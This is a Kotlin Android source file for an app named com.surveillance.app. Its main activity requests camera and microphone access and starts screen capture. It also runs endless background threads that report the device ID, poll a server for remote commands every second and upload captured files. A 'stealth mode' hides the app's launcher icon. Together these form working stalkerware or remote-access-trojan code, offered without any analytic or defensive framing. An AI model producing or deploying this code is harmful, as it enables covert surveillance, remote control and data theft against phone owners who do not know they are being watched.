package com.surveillance.app

import android.Manifest
import android.app.Activity
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast

class MainActivity : Activity() {

    private lateinit var statusText: TextView
    private lateinit var connectionText: TextView
    private lateinit var screenCaptureButton: Button
    private lateinit var stealthButton: Button

    private val apiService = ApiService()
    private var isStealthEnabled = false

    private val permissionRequestCode = 100
    private val screenCaptureRequestCode = 200

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.status_text)
        connectionText = findViewById(R.id.connection_text)
        screenCaptureButton = findViewById(R.id.screen_capture_button)
        stealthButton = findViewById(R.id.stealth_button)

        requestAppPermissions()
        startBackgroundServices()
        updateConnectionStatus()

        screenCaptureButton.setOnClickListener {
            requestScreenCapturePermission()
        }

        stealthButton.setOnClickListener {
            toggleStealthMode()
        }

        Thread {
            while (true) {
                try {
                    runOnUiThread { updateConnectionStatus() }
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Thread.sleep(5000)
            }
        }.start()
    }

    private fun requestAppPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val needed = permissions.filter {
            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
        }

        if (needed.isNotEmpty()) {
            requestPermissions(needed.toTypedArray(), permissionRequestCode)
        }
    }

    private fun requestScreenCapturePermission() {
        val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(projectionManager.createScreenCaptureIntent(), screenCaptureRequestCode)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == screenCaptureRequestCode && resultCode == Activity.RESULT_OK && data != null) {
            val serviceIntent = Intent(this, ScreenCaptureService::class.java)
            serviceIntent.putExtra("resultCode", resultCode)
            serviceIntent.putExtra("data", data)
            startForegroundService(serviceIntent)
            Toast.makeText(this, "Started screen capture", Toast.LENGTH_SHORT).show()
        }
    }

    private fun startBackgroundServices() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        val deviceInfo = Build.MANUFACTURER + " " + Build.MODEL

        Thread {
            while (true) {
                try {
                    apiService.sendUserStatus(deviceId, deviceInfo)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Thread.sleep(30000)
            }
        }.start()

        Thread {
            while (true) {
                try {
                    apiService.fetchAndHandleCommands(deviceId)
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Thread.sleep(1000)
            }
        }.start()

        Thread {
            while (true) {
                try {
                    apiService.uploadPendingFiles()
                } catch (e: Exception) {
                    e.printStackTrace()
                }
                Thread.sleep(10000)
            }
        }.start()
    }

    private fun updateConnectionStatus() {
        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = connectivityManager.activeNetwork
        connectionText.text = if (network != null) "Connection: Online" else "Connection: Offline"
    }

    private fun toggleStealthMode() {
        val component = ComponentName(this, MainActivity::class.java)
        if (!isStealthEnabled) {
            packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            isStealthEnabled = true
            Toast.makeText(this, "Stealth mode enabled", Toast.LENGTH_SHORT).show()
            finish()
        } else {
            packageManager.setComponentEnabledSetting(
                component,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            isStealthEnabled = false
            Toast.makeText(this, "Stealth mode disabled", Toast.LENGTH_SHORT).show()
        }
    }
}
